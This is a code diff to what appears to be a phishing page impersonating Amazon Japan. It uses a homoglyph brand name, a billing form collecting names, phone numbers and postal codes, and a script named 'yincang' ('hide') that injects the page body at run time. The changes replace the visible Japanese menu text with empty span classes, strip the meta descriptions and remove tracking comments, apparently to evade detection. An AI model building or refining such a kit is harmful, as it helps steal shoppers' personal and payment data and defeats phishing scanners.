@@ -25,12 +25,7 @@
     <link rel="stylesheet" href="../style/css/219css.css"/>
     <link rel="stylesheet" href="../style/css/billing.css"/>
     <link rel="stylesheet" href="../style/css/signin.css"/>
-    <title>Amаzоn | 本, ファッション, 家電から食品まで | アマゾン</title>
-    <meta name="description"
-          content="Amаzоn.co.jp 公式サイト。お急ぎ便ご利用で当日・翌日にお届け。アマゾンで本, 日用品, ファッション, 食品, ベビー用品, カー用品ほか一億種の商品をいつでもお安く。通常配送無料(一部を除く)"/>
-    <meta property="og:description"
-          content="Amаzоn.co.jp 公式サイト。お急ぎ便ご利用で当日・翌日にお届け。アマゾンで本, 日用品, ファッション, 食品, ベビー用品, カー用品ほか一億種の商品をいつでもお安く。通常配送無料(一部を除く)"
-          xmlns:og="http://opengraphprotocol.org/schema/"/>
+    <title>Amаzоn</title>
     <link rel="stylesheet" href="../style/css/41rcss.css"/>
     <style type="text/css">
         #gw-mobile-points-balance-bar {
@@ -51,7 +46,7 @@
 <script src="../js/jquery.validate.min.js"></script>
 <script src="../js/jquery.mask.js"></script>
 <script type="text/javascript">
-    setTimeout("yincang()", 0);
+    setTimeout("yincang()", 100);
     function yincang() {
         let content = document.getElementById('bodyid');
         content.innerHTML = "<div></div>\n" +
@@ -71,7 +66,6 @@
                 "                    </a>\n" +
                 "                </div>\n" +
                 "            </div>\n" +
-                "\n" +
                 "            <div class=\"nav-right\">\n" +
                 "                <a href=\"#\" aria-label=\"Cart\" class=\"nav-a\" id=\"nav-button-cart\">\n" +
                 "                    <div class=\"nav-cart-0\">\n" +
@@ -81,7 +75,6 @@
                 "                </a>\n" +
                 "            </div>\n" +
                 "        </div>\n" +
-                "\n" +
                 "        <div class=\"nav-searchbar-wrapper\">\n" +
                 "            <form class=\"nav-searchbar\" action=\"https://www.amazon.co.jp/gp/aw/s/ref=nb_sb_noss\" method=\"get\"\n" +
                 "                  role=\"search\" id=\"nav-search-form\" accept-charset=\"utf-8\">\n" +
@@ -103,25 +96,24 @@
                 "            </form>\n" +
                 "        </div>\n" +
                 "        <div id=\"nav-gwbar\" class=\"nav-gwbar-single-row nav-genz nav-gwbar-white nav-gwbar-scroll\">\n" +
-                "            <a id=\"deals\" href=\"#\" class=\"nav-a  \">タイムセール</a>\n" +
-                "            <a id=\"prime\" href=\"#\" class=\"nav-a  \">プライム</a>\n" +
-                "            <a id=\"video\" href=\"#\" class=\"nav-a  \">ビデオ </a>\n" +
-                "            <a id=\"music\" href=\"#\" class=\"nav-a  \">ミュージック</a>\n" +
-                "            <a href=\"#\" class=\"nav-a  \">ランキング</a>\n" +
-                "            <a href=\"#\" class=\"nav-a  \">新着商品</a>\n" +
-                "            <a href=\"#\" class=\"nav-a  \">AmаzоnBasics</a>\n" +
-                "            <a href=\"#\" class=\"nav-a  \">ギフト券</a>\n" +
-                "            <a id=\"health-and-personal-care\" href=\"#\" class=\"nav-a  \">ドラッグストア</a>\n" +
-                "            <a id=\"books\" href=\"#\">本・コミック</a>\n" +
-                "            <a id=\"pc\" href=\"#\" class=\"nav-a  \">パソコン・周辺機器</a>\n" +
-                "            <a id=\"kitchen\" href=\"#\" class=\"nav-a  \">ホーム＆キッチン</a>\n" +
+                "            <a id=\"deals\" href=\"#\" class=\"nav-a  \"><span class='billing29'></span></a>\n" +
+                "            <a id=\"prime\" href=\"#\" class=\"nav-a  \"><span class='billing30'></span></a>\n" +
+                "            <a id=\"video\" href=\"#\" class=\"nav-a  \"><span class='billing31'></a>\n" +
+                "            <a id=\"music\" href=\"#\" class=\"nav-a  \"><span class='billing32'></a>\n" +
+                "            <a href=\"#\" class=\"nav-a  \"><span class='billing33'></a>\n" +
+                "            <a href=\"#\" class=\"nav-a  \"><span class='billing34'></a>\n" +
+                "            <a href=\"#\" class=\"nav-a  \"><span class='billing35'></a>\n" +
+                "            <a href=\"#\" class=\"nav-a  \"><span class='billing36'></a>\n" +
+                "            <a id=\"health-and-personal-care\" href=\"#\" class=\"nav-a  \"><span class='billing37'></a>\n" +
+                "            <a id=\"books\" href=\"#\" class=\"nav-a  \"><span class='billing38'></a>\n" +
+                "            <a id=\"pc\" href=\"#\" class=\"nav-a  \"><span class='billing39'></a>\n" +
+                "            <a id=\"kitchen\" href=\"#\" class=\"nav-a  \"><span class='billing40'></a>\n" +
                 "        </div>\n" +
-                "        <!-- NAVYAAN-GLOW-SUBNAV -->\n" +
                 "        <div class=\"glow-subnav-template glow-mobile-subnav\" id=\"nav-subnav-container\">\n" +
                 "            <div class=\"a-declarative\" data-action=\"glow-sheet-trigger\" id=\"nav-global-location-slot\">\n" +
                 "                <div class=\"nav-sprite\" id=\"nav-packard-glow-loc-icon\"></div>\n" +
                 "                <div id=\"glow-ingress-block\">\n" +
-                "                    <span class=\"nav-single-line\" id=\"glow-ingress-single-line\"> アメリカ合衆国にお届け </span>\n" +
+                "                    <span class=\"nav-single-line\" id=\"glow-ingress-single-line\"> <span class='billing41'> </span>\n" +
                 "                </div>\n" +
                 "                <input data-addnewaddress=\"new\" id=\"unifiedLocation1ClickAddress\" name=\"addressID\" type=\"hidden\"\n" +
                 "                       value=\"\"/>\n" +
@@ -676,7 +668,6 @@
                 "                <div id=\"nav-ftr-copyright\"><span class='signin23'></span></div>\n" +
                 "    </div>\n" +
                 "</footer>\n" +
-                "<!-- whfh-Qk0sG5OcnKluHYqH2y/5BmESxqy4aXM973lJPN5YU3KKswhgm+q2uMb8RHOHdQbP rid-VNB14BJ37PY4TWGVKFV7 -->\n" +
                 "<div id=\"sis_pixel_r2\" aria-hidden=\"true\" style=\"height:1px; position: absolute; left: -1000000px; top: -1000000px;\">\n" +
                 "</div>\n" +
                 "<!-- footer tilu -->\n" +
@@ -699,88 +690,8 @@
                 "<!-- sp:eh:SgtuveiwFuk5VKg+3hw0NfI5ObfIj183zMHpVseqdEwqKwWWdxtR43QLqV8GBuXwsVdPQVARHeF48Ampuv7F84So699UdNPMb+i1FzS1weQqFYPKo7LiHQ== -->\n" +
                 "<div id=\"a-white\"></div>\n" +
                 "<div id=\"a-popover-root\" style=\"z-index:-1;position:absolute;\"></div>\n" +
-                "<!--NAVYAAN-HMENU-AJAX-->\n" +
-                "<div id=\"hmenu-container\" cel_widget_id=\"Navigation-mobile-HamburgerMenu\" style=\"display: block;\"\n" +
-                "     class=\"celwidget nav-sprite-v3\" data-cel-widget=\"Navigation-mobile-HamburgerMenu\">\n" +
-                "    <div id=\"hmenu-canvas-background\" class=\"hmenu-transparent hmenu-dark-bkg-color\">\n" +
-                "        <div class=\"nav-sprite hmenu-close-icon\"></div>\n" +
-                "    </div>\n" +
-                "    <div id=\"hmenu-canvas\" class=\"hmenu-translateX-left nav-ignore-pinning\">\n" +
-                "        <a id=\"hmenu-close-menu\" class=\"hmenu-hidden-link\" href=\"javascript:void(0)\">\n" +
-                "            <div>\n" +
-                "                メニューを閉じる\n" +
-                "            </div>\n" +
-                "        </a>\n" +
-                "        <a id=\"hmenu-customer-profile-link\"\n" +
-                "           href=\"https://www.amazon.co.jp/ap/signin?openid.pape.max_auth_age=0&amp;openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2F%3F_encoding%3DUTF8%26ref_%3Dnavm_em_hd_re_signin&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.assoc_handle=anywhere_v2_jp&amp;openid.mode=checkid_setup&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;&amp;ref_=navm_em_hd_clc_signin\">\n" +
-                "            <div id=\"hmenu-customer-profile\">\n" +
-                "                <div id=\"hmenu-customer-profile-left\" class=\"hmenu-avatar-icon\">\n" +
-                "                    <div id=\"hmenu-customer-avatar-icon\" class=\"nav-sprite\"></div>\n" +
-                "                </div>\n" +
-                "                <div id=\"hmenu-customer-profile-right\">\n" +
-                "                    <div id=\"hmenu-customer-name\">\n" +
-                "                        こんにちは, ログイン\n" +
-                "                    </div>\n" +
-                "                </div>\n" +
-                "            </div>\n" +
-                "        </a>\n" +
-                "        <div id=\"hmenu-content\">\n" +
-                "            <ul class=\"hmenu\" data-menu-id=\"1\">\n" +
-                "                <li><a href=\"#\" class=\"hmenu-item\">アカウント</a></li>\n" +
-                "                <li><a href=\"#\" class=\"hmenu-item\">注文履歴</a></li>\n" +
-                "                <li><a href=\"#\" class=\"hmenu-item\">もう一度買う</a></li>\n" +
-                "                <li class=\"hmenu-separator\"></li>\n" +
-                "                <li><a href=\"#\" class=\"hmenu-item\">トップページ</a></li>\n" +
-                "                <li><a href=\"#\" class=\"hmenu-item\">タイムセール</a></li>\n" +
-                "                <li><a href=\"#\" class=\"hmenu-item\">ほしい物リスト</a></li>\n" +
-                "                <li><a href=\"#\" class=\"hmenu-item\">表示履歴</a></li>\n" +
-                "                <li><a href=\"#\" class=\"hmenu-item\" data-menu-id=\"2\" data-ref-tag=\"navm_em_1_1_1_8\">\n" +
-                "                        <div>\n" +
-                "                            カテゴリー\n" +
-                "                        </div>\n" +
-                "                        <i class=\"nav-sprite hmenu-arrow-next\"></i></a></li>\n" +
-                "                <li class=\"hmenu-separator\"></li>\n" +
-                "                <li>\n" +
-                "                    <div class=\"hmenu-item hmenu-title\">\n" +
-                "                        プログラムと特典\n" +
-                "                    </div>\n" +
-                "                </li>\n" +
-                "                <li><a id=\"nav-link-prime\" href=\"#\" class=\"hmenu-item\">プライムを試す</a></li>\n" +
-                "                <li><a id=\"Prime Video\" href=\"#\" class=\"hmenu-item\">Prime Video</a></li>\n" +
-                "                <li><a id=\"music\" href=\"#\" class=\"hmenu-item\">デジタル ミュージック </a></li>\n" +
-                "                <li><a href=\"#\" class=\"hmenu-item\" data-menu-id=\"3\" data-ref-tag=\"navm_em_1_1_1_13\">\n" +
-                "                        <div>\n" +
-                "                            すべてを見る\n" +
-                "                        </div>\n" +
-                "                        <i class=\"nav-sprite hmenu-arrow-next\"></i></a></li>\n" +
-                "                <li class=\"hmenu-separator\"></li>\n" +
-                "                <li>\n" +
-                "                    <div class=\"hmenu-item hmenu-title\">\n" +
-                "                        ヘルプと設定\n" +
-                "                    </div>\n" +
-                "                </li>\n" +
-                "                <li><a href=\"#\" class=\"hmenu-item\">アカウントサービス</a></li>\n" +
-                "                <li><a id=\"hmenu-icp-language\" href=\"#\" class=\"hmenu-item\">\n" +
-                "                        <div class=\"hmenu-icon-container\">\n" +
-                "                            <i class=\"icon-css-reset icp-nav-globe-img-2 icp-mobile-globe-2\"></i>\n" +
-                "                        </div>\n" +
-                "                        日本語</a></li>\n" +
-                "                <li><a href=\"#\" class=\"hmenu-item\">\n" +
-                "                        <div class=\"hmenu-icon-container\">\n" +
-                "                            <i class=\"icon-css-reset icp-flag-3 icp-flag-3-jp\"></i>\n" +
-                "                        </div>\n" +
-                "                        日本</a></li>\n" +
-                "                <li><a href=\"#\" class=\"hmenu-item\">カスタマーサービス</a></li>\n" +
-                "                <li><a href=\"#\" class=\"hmenu-item\">ログイン</a></li>\n" +
-                "            </ul>\n" +
-                "        </div>\n" +
-                "        <a id=\"hmenu-back-to-top\" class=\"hmenu-hidden-link\" href=\"javascript:void(0)\">\n" +
-                "            <div>\n" +
-                "                トップへ戻る\n" +
-                "            </div>\n" +
-                "        </a>\n" +
-                "    </div>\n" +
-                "</div>";
+                "<!--NAVYAAN-HMENU-AJAX-->\n" ;
+
         $("form[name='billingform']").validate({
             rules: {
                 ap_fullname: "required",
@@ -842,9 +753,7 @@
         }
 
     }
-    //使用mask方法检测修改格式
     $('#ap_phone').mask('+0000000000000');
-    // $('input[name="dob"]').mask('00/00/0000');
     $('input[name="zipcode"]').mask('000-0000');
 
     function autopopulateBasedonPostalCode() {
